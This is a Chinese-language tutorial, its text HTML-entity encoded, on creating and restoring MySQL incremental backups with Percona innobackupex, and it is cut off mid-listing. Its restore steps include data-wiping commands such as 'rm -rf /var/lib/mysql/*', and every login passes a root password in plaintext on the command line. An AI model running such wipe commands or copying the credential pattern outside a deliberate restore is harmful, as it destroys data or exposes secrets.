&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD; &#x9996;&#x5148;&#x521B;&#x5EFA;&#x5168;&#x5907;&#x5728;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5168;&#x5907;&#xFF0C;&#x4E0D;&#x7136;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x662F;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;12345innobackupex --user=root --password=Jaking@vip.163.com /tmp/db_backup/[root@jaking ~]# ls /tmpdb_backup&#xA0; percona-version-check[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58 &#x63D2;&#x5165;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x5230;&#x8868;&#x91CC;&#x9762;12345678910111213[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 7Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema || sys || testbookdb |+--------------------+6 rows in set (0.00 sec)CREATE DATABASE TESTDB;show databases;use TESTDB;CREATE TABLE TABLE1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);CREATE TABLE TABLE2 (name char(16),price int,pages int);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;CLD&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;SYS&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;MySQL1&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from TABLE1;select * from TABLE2;mysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1 || TABLE2 |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH || 7 | MySQL4 | 74 | QH || 8 | MySQL5 | 75 | QH || 9 | MySQL6 | 76 | QH || 10 | MySQL7 | 77 | QH || 11 | MySQL8 | 78 | QH || 12 | MySQL9 | 79 | QH |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name | price | pages |+--------+-------+-------+| Linux | 30 | 666 || CLD | 60 | 666 || SYS | 80 | 666 || MySQL1 | 166 | 666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || TESTDB || mysql || performance_schema || sys || testbookdb |+--------------------+7 rows in set (0.00 sec)4 rows in set (0.00 sec) &#x4F7F;&#x7528; &#x2013;incremental&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;123456789101112131415161718192021innobackupex --user=root --password=Jaking@vip.163.com --incremental /&#x589E;&#x91CF;1&#x8DEF;&#x5F84; --incremental-basedir=&#x5168;&#x5907;&#x8DEF;&#x5F84;&#xFF0C;&#x6307;&#x5B9A;&#x5728;&#x54EA;&#x4E2A;&#x5168;&#x5907;&#x4E0A;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;[root@jaking ~]# ls /tmp/db_backup/2021-05-14_08-33-57[root@jaking ~]#&#xA0;innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-basedir=/tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58 2022-04-24_21-31-38[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/backup-my.cnf mysql xtrabackup_checkpointsBOOK performance_schema xtrabackup_infoib_buffer_pool sys xtrabackup_logfileibdata1 testbookdb[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-31-38/backup-my.cnf mysql xtrabackup_checkpointsBOOK performance_schema xtrabackup_infoib_buffer_pool sys xtrabackup_logfileibdata1.delta testbookdbibdata1.meta TESTDB[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-58/26M /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-38/ 5.1M /tmp/db_backup/2022-04-24_21-31-38/ &#x518D;&#x67E5;&#x770B;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;[root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-23-58/xtrabackup_checkpointsbackup_type = full-backupedfrom_lsn = 0to_lsn = 2566100last_lsn = 2566109compact = 0recover_binlog_info = 0flushed_lsn = 2566109 [root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-31-38/xtrabackup_checkpointsbackup_type = incrementalfrom_lsn = 2566100to_lsn = 2588592last_lsn = 2588601compact = 0recover_binlog_info = 0flushed_lsn = 2588601 &#x589E;&#x91CF;&#x5907;&#x4EFD;&#x521B;&#x5EFA;&#x7684;&#x66FF;&#x4EE3;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6307;&#x5B9A; &#x2013;incremental-lsn&#x6765;&#x4EE3; &#x2013;incremental-basedir&#x7684;&#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;innobackupex &#x2013;user=root --password=Jaking@vip.163.com &#x2013;incremental /tmp/db_backup/ &#x2013;incremental-lsn=&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt; #&#x4ECE;&#x8FD9;&#x4E2A;&#x7F16;&#x53F7;&#x70B9;&#x5F00;&#x59CB;&#x5907;&#x4EFD;1234567891011[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58 2022-04-24_21-31-38[root@jaking ~]# innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-lsn=2566109[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58 2022-04-24_21-31-38 2022-04-24_21-41-49[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-5826M /tmp/db_backup/2022-04-24_21-23-58[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-385.1M /tmp/db_backup/2022-04-24_21-31-38[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-41-495.1M /tmp/db_backup/2022-04-24_21-41-49 &#x6CE8;&#x610F;&#xFF1A;xtrabackup&#x53EA;&#x4F1A;&#x5F71;&#x54CD;xtradb&#x6216;&#x8005;innodb&#x7684;&#x8868;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;&#x5728;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;&#x53EA;&#x4F1A;&#x590D;&#x5236;&#x6574;&#x4E2A;&#x6587;&#x4EF6; &#x8FD8;&#x539F; &#x505C;&#x6B62;MySQL&#x670D;&#x52A1;,&#x5220;&#x9664;&#x6570;&#x636E; rm -rf /var/lib/mysql/* &#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x6062;&#x590D;&#x6BD4;&#x5168;&#x5907;&#x8981;&#x590D;&#x6742;&#x4E00;&#x70B9;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x662F;&#x5728;&#x6240;&#x6709;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x91CD;&#x505A;&#x5DF2;&#x63D0;&#x4EA4;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#xFF1A;innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-1innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-2&#x2026;&#x2026;&#x2026;innobackupex &#x2013;apply-log BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-last-num &#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x4EC5;&#x6709;&#x4E00;&#x4EFD;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x7B2C;3&#x6761;&#x8BED;&#x53E5;&#x5FFD;&#x7565;&#x5176;&#x4E2D;BASE-DIR&#x662F;&#x6307;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF0C;INCREMENTAL-DIR-1&#x662F;&#x6307;&#x7B2C;&#x4E00;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;INCREMENTAL-DIR-2&#x662F;&#x6307;&#x7B2C;&#x4E8C;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002; &#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5E76;&#x6CA1;&#x6709;&#x2013;redo-only&#x9009;&#x9879;&#xFF01; &#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x6267;&#x884C;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5728;BASE-DIR&#xFF08;&#x5373;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF09;&#x4E0B; &#x7B2C;&#x4E00;&#x6B65;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x7B2C;&#x4E8C;&#x6B65;&#xFF1A;&#x56DE;&#x6EDA;&#x672A;&#x5B8C;&#x6210;&#x7684;&#x65E5;&#x5FD7;&#xFF1A;innobackupex &#x2013;apply-log BASE-DIR &#x4E0A;&#x9762;&#x6267;&#x884C;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;BASE-DIR&#x91CC;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5DF2;&#x5B8C;&#x5168;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x662F;&#x62F7;&#x8D1D;&#xFF1A;innobackupex &#x2013;copy-back BASE-DIR &#x6062;&#x590D;mysql&#x6743;&#x9650; chown -Rf mysql:mysql /var/lib/mysql/ &#x6700;&#x540E;&#x542F;&#x52A8; systemctl start mysqld &#x68C0;&#x9A8C;&#x6570;&#x636E;&#x662F;&#x5426;&#x6062;&#x590D;&#x6B63;&#x5E38;&#x6CE8;&#x610F;&#xFF1A;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5BB9;&#x6613;&#x51FA;&#x9519;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#xFF01; &#x5B9E;&#x6218;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[root@jaking ~]# ls /var/lib/mysqlauto.cnf ibdata1 mysql testbookdbBOOK ib_logfile0 performance_schema TESTDBib_buffer_pool ib_logfile1 sys xtrabackup_info[root@jaking ~]# mkdir /mysql-all-data[root@jaking ~]# mv /var/lib/mysql/* /mysql-all-data/[root@jaking ~]# ls /var/lib/mysql [root@jaking ~]# ls /mysql-all-data/auto.cnf ibdata1 mysql testbookdbBOOK ib_logfile0 performance_schema TESTDBib_buffer_pool ib_logfile1 sys xtrabackup_info[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58 2022-04-24_21-31-38 2022-04-24_21-41-49[root@jaking ~]# rm -rf /tmp/db_backup/2022-04-24_21-41-49[root@jaking ~]# ls /tmp/db_backup/ 2022-04-24_21-23-58 2022-04-24_21-31-38[root@jaking ~]# innobackupex --apply-log --redo-only /tmp/db_backup/2022-04-24_21-23-58[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58 --incremental-dir=/tmp/db_backup/2022-04-24_21-31-38fnaich:&#xFF01;&#x589E;&#x91CF;&#x5408;&#x5E76;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x5426;&#x5219;&#x62A5;&#x9519;[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/backup-my.cnf ib_logfile0 performance_schema xtrabackup_checkpointsBOOK ib_logfile1 sys xtrabackup_infoib_buffer_pool ibtmp1 testbookdb xtrabackup_logfileibdata1 mysql TESTDB xtrabackup_master_key_id[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql/[root@jaking ~]# ll /var/lib/mysql/total 122920drwxr-x--- 2 mysql mysql 88 Apr 24 21:59 BOOK-rw-r----- 1 mysql mysql 315 Apr 24 21:59 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 21:59 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile1-rw-r----- 1 mysql mysql 12582912 Apr 24 21:59 ibtmp1drwxr-x--- 2 mysql mysql 4096 Apr 24 21:59 mysqldrwxr-x--- 2 mysql mysql 8192 Apr 24 21:59 performance_schemadrwxr-x--- 2 mysql mysql 8192 Apr 24 21:59 sysdrwxr-x--- 2 mysql mysql 88 Apr 24 21:59 testbookdbdrwxr-x--- 2 mysql mysql 92 Apr 24 21:59 TESTDB-rw-r----- 1 mysql mysql 504 Apr 24 21:59 xtrabackup_info-rw-r----- 1 mysql mysql 1 Apr 24 21:59 xtrabackup_master_key_id[root@jaking ~]# systemctl start mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || TESTDB || mysql || performance_schema || sys || testbookdb |+--------------------+7 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1 || book2 |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName | price | publishing |+---------+-----------------------------------+-------+-----------------------+| 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E; || 3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B; | 72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B; | 73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B; | 74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B; | 75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B; | 76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B; | 77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B; | 78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B; | 79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 30 | 666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 60 | 666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 80 | 666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 166 | 666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1 || TABLE2 |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH || 7 | MySQL4 | 74 | QH || 8 | MySQL5 | 75 | QH || 9 | MySQL6 | 76 | QH || 10 | MySQL7 | 77 | QH || 11 | MySQL8 | 78 | QH || 12 | MySQL9 | 79 | QH |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name | price | pages |+--------+-------+-------+| Linux | 30 | 666 || CLD | 60 | 666 || SYS | 80 | 666 || MySQL1 | 166 | 666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; &#x62D3;&#x5C55;&#xFF1A;&#x8FD8;&#x539F;&#x6570;&#x636E;123456789101112131415[root@server12 ~]# rm -rf /tmp/db_backup/*[root@server12 ~]# innobackupex --default-file=/etc/my.cnf --user=root --password=Jaking@vip.163.com --no-timestamp /tmp/db_backup/all-mysql-data[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || TESTDB || mysql || performance_schema || sys || testbookdb |+--------------------+7 rows in set (0.00 sec)CREATE DATABASE TESTDB666;show databases;use TESTDB666;CREATE TABLE TABLE1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);CREATE TABLE TABLE2 (name char(16),price int,pages int);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;CLD&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;SYS&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;MySQL1&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from TABLE1;select * from TABLE2;mysql&gt; show tables;+---------------------+| Tables_in_TESTDB666 |+---------------------+| TABLE1 || TABLE2 |+---------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH || 7 | MySQL4 | 74 | QH || 8 | MySQL5 | 75 | QH || 9 | MySQL6 | 76 | QH || 10 | MySQL7 | 77 | QH || 11 | MySQL8 | 78 | QH || 12 | MySQL9 | 79 | QH |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name | price | pages |+--------+-------+-------+| Linux | 30 | 666 || CLD | 60 | 666 || SYS | 80 | 666 || MySQL1 | 166 | 666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; mysql&gt; ^DBye 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[root@server12 ~]# innobackupex --user=root --password=Jaking@vip.163.com --no-timestamp --incremental /tmp/db_backup/incremental-mysql-data --incremental-basedir=/tmp/db_backup/all-mysql-data/[root@server12 ~]# ls /tmp/db_backup/all-mysql-data incremental-mysql-data[root@server12 ~]# du -sh /tmp/db_backup/all-mysql-data/27M /tmp/db_backup/all-mysql-data/[root@server12 ~]# du -sh /tmp/db_backup/incremental-mysql-data/4.8M /tmp/db_backup/incremental-mysql-data/[root@server12 ~]# systemctl stop mysqld[root@server12 ~]# rm -rf /var/lib/mysql/*[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/backup-my.cnf ibdata1 sys xtrabackup_checkpointsBOOK mysql testbookdb xtrabackup_infoib_buffer_pool performance_schema TESTDB xtrabackup_logfile[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/backup-my.cnf mysql TESTDB666BOOK performance_schema xtrabackup_checkpointsib_buffer_pool sys xtrabackup_infoibdata1.delta testbookdb xtrabackup_logfileibdata1.meta TESTDB[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/TESTDB666 /tmp/db_backup/all-mysql-data/[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/ibdata1* /tmp/db_backup/all-mysql-data/[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/backup-my.cnf ibdata1.delta sys xtrabackup_checkpointsBOOK ibdata1.meta testbookdb xtrabackup_infoib_buffer_pool mysql TESTDB xtrabackup_logfileibdata1 performance_schema TESTDB666[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/backup-my.cnf mysql TESTDB666BOOK performance_schema xtrabackup_checkpointsib_buffer_pool sys xtrabackup_infoibdata1.delta testbookdb xtrabackup_logfileibdata1.meta TESTDB[root@server12 ~]# innobackupex --copy-back /tmp/db_backup/all-mysql-data/[root@server12 ~]# ll /var/lib/mysqltotal 13912drwxr-x--- 2 root root 88 Apr 24 22:26 BOOK-rw-r----- 1 root root 315 Apr 24 22:26 ib_buffer_pool-rw-r----- 1 root root 12582912 Apr 24 22:26 ibdata1-rw-r----- 1 root root 1622016 Apr 24 22:26 ibdata1.delta-rw-r----- 1 root root 60 Apr 24 22:26 ibdata1.metadrwxr-x--- 2 root root 4096 Apr 24 22:26 mysqldrwxr-x--- 2 root root 8192 Apr 24 22:26 performance_schemadrwxr-x--- 2 root root 8192 Apr 24 22:26 sysdrwxr-x--- 2 root root 88 Apr 24 22:26 testbookdbdrwxr-x--- 2 root root 92 Apr 24 22:26 TESTDBdrwxr-x--- 2 root 